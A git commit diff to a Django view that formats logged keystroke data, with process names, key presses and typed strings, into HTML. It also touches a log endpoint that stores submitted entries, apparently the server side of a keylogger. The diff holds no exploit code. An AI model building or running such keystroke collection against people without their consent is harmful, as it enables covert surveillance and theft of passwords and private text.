59c6726c17f8849ad902c60b956ef28ad3ccdd19
Frex <nico.fretti@gmail.com>
2022-01-05 01:23:50 +0100

    Mad regex

--- Server/api/views.py
+++ Server/api/views.py
@@ -40,20 +40,32 @@ def translate_key(key: str):
         return "<kbd>Esc</kbd>"
     elif key == "Oemplus":
         return "<kbd>+</kbd>"
+    elif key == "DML":
+        return "<kbd>Double click</kbd>"
+    elif key == "ML":
+        return "<kbd>Click</kbd>"
+    elif key == "MR":
+        return "<kbd>Right click</kbd>"
     return "<kbd>{}</kbd>".format(key)
 
-
+# <span><1></span><kbd>DML</kbd>ASDASD<kbd>Back</kbd>...<kbd>Ctrl</kbd>ZZZZZ
 def get_content(raw_data: str):
     # format: string that contains all events logged "asdasdasd<process_name,...>[key]..."
     # return string where all key are replaced with value
     processes_list = re.findall(r'<(.*?)>', raw_data)
+    data_for_strings = raw_data
     cont = 1
     for processes in processes_list:
-        raw_data = raw_data.replace("<" + processes + ">", "<p>processes_{}<p>".format(cont))
+        raw_data = raw_data.replace("<" + processes + ">", "<span class='process'>{}</span>".format(cont),1)
+        data_for_strings = data_for_strings.replace("<"+processes+">","$")
         cont += 1
     key_to_replace = re.findall(r'\[(.*?)\]', raw_data)
     for key in key_to_replace:
-        raw_data = raw_data.replace("[" + key + "]", translate_key(key))
+        raw_data = raw_data.replace("[" + key + "]", translate_key(key),1)
+        data_for_strings = data_for_strings.replace("["+key+"]", "$")
+    strings = re.findall(r'([A-Za-z0-9]+)', data_for_strings)
+    for string in strings:
+        raw_data = raw_data.replace(string, "<span class='string'>{}</span>".format(string),1)
     return raw_data
 
 
@@ -63,7 +75,6 @@ def log(request):
         return HttpResponse(status=404)
     # Request data are in json format
     data = json.load(request)
-    print(data['key'])
     key = models.LoggerKey.objects.get(key=data['key'])
     lines = data['content'].split(' $ ')
     for line in lines:
